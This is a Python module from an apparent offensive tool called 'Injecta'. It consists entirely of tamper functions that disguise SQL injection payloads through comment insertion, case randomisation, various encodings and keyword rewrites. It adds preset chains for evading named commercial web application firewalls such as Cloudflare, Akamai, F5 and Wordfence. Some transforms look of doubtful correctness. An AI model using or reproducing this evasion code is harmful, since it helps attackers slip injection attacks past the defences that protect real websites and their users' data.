"""
Injecta — WAF/IDS evasion tamper scripts
"""
import random
import re


def tamper_space2comment(payload: str) -> str:
    return re.sub(r"\s+", "/**/", payload)


def tamper_space2plus(payload: str) -> str:
    return payload.replace(" ", "+")


def tamper_case_random(payload: str) -> str:
    result = []
    for c in payload:
        if c.isalpha():
            result.append(c.upper() if random.randint(0, 1) else c.lower())
        else:
            result.append(c)
    return "".join(result)


def tamper_hexencode(payload: str) -> str:
    return "".join(f"\\x{ord(c):02x}" if c.isalpha() else c for c in payload)


def tamper_comment_before_keywords(payload: str) -> str:
    keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "SLEEP", "BENCHMARK", "INTO", "EXEC"]
    for kw in keywords:
        payload = re.sub(rf"\b{kw}\b", f"/**/{kw}", payload, flags=re.IGNORECASE)
    return payload


def tamper_eq2like(payload: str) -> str:
    return re.sub(r"\s*=\s*", " LIKE ", payload)


def tamper_lowercase(payload: str) -> str:
    return payload.lower()


def tamper_uppercase(payload: str) -> str:
    return payload.upper()


def tamper_versioned_mysql(payload: str) -> str:
    return re.sub(r"SELECT", "/*!50000SELECT*/", payload, flags=re.IGNORECASE)


def tamper_charencode(payload: str) -> str:
    return "".join(f"CHAR({ord(c)})" if c.isalpha() and random.random() > 0.5 else c for c in payload)


def tamper_nested_comment(payload: str) -> str:
    nested = "".join(f"/**/{c}/**/" for c in "/**/")
    return re.sub(r"/\*\*/", nested, payload)


def tamper_unicode_urlencode(payload: str) -> str:
    return "".join(f"%u{ord(c):04X}" if c.isalpha() and random.random() > 0.6 else c for c in payload)


def tamper_hex2dec(payload: str) -> str:
    def _replace_hex(m):
        try:
            return str(int(m.group(1), 16))
        except ValueError:
            return m.group(0)
    return re.sub(r"0x([0-9a-fA-F]+)", _replace_hex, payload)


def tamper_comment_between_keywords(payload: str) -> str:
    return re.sub(r"(\b\w+\b)\s+(?=\b\w+\b)", r"\1/**/", payload)


def tamper_scientific_notation(payload: str) -> str:
    return re.sub(r"\b(\d+)\b", lambda m: f"{m.group(1)}e0" if random.random() > 0.7 else m.group(0), payload)


def tamper_nullbyte(payload: str) -> str:
    return "%00" + payload


def tamper_double_urlencode(payload: str) -> str:
    return "".join(f"%25{ord(c):02x}" if not c.isalnum() and c not in " %" else c for c in payload)


def tamper_greatest(payload: str) -> str:
    return re.sub(r"\b(1=1|true)\b", "GREATEST(1,1)=1", payload, flags=re.IGNORECASE)


def tamper_least(payload: str) -> str:
    return re.sub(r"\b(1=2|false)\b", "LEAST(1,2)=2", payload, flags=re.IGNORECASE)


TAMPER_MAP = {
    "space2comment": tamper_space2comment,
    "space2plus": tamper_space2plus,
    "randomcase": tamper_case_random,
    "hexencode": tamper_hexencode,
    "commentkeywords": tamper_comment_before_keywords,
    "eq2like": tamper_eq2like,
    "lowercase": tamper_lowercase,
    "uppercase": tamper_uppercase,
    "versioned_mysql": tamper_versioned_mysql,
    "charencode": tamper_charencode,
    "nested_comment": tamper_nested_comment,
    "unicode_urlencode": tamper_unicode_urlencode,
    "hex2dec": tamper_hex2dec,
    "comment_between": tamper_comment_between_keywords,
    "scientific": tamper_scientific_notation,
    "nullbyte": tamper_nullbyte,
    "double_urlencode": tamper_double_urlencode,
    "greatest": tamper_greatest,
    "least": tamper_least,
}


def apply_tampers(payload: str, tamper_names: list[str]) -> str:
    for name in tamper_names:
        func = TAMPER_MAP.get(name)
        if func:
            payload = func(payload)
    return payload


AUTO_CHAINS = {
    "modsecurity": ["space2comment", "commentkeywords", "hexencode"],
    "cloudflare": ["randomcase", "commentkeywords", "versioned_mysql"],
    "aws": ["space2comment", "lowercase", "comment_between"],
    "akamai": ["randomcase", "space2comment", "nested_comment"],
    "f5": ["commentkeywords", "hexencode", "double_urlencode"],
    "sucuri": ["space2comment", "randomcase", "nullbyte"],
    "barracuda": ["space2comment", "eq2like", "greatest"],
    "wordfence": ["lowercase", "space2comment", "unicode_urlencode"],
    "generic": ["space2comment", "randomcase", "commentkeywords"],
}


def build_chain(waf_name: str = "generic") -> list[str]:
    return AUTO_CHAINS.get(waf_name.lower(), AUTO_CHAINS["generic"])


def suggest_chains(detected_wafs: list[str]) -> list[list[str]]:
    return [build_chain(w) for w in detected_wafs] if detected_wafs else [build_chain("generic")]
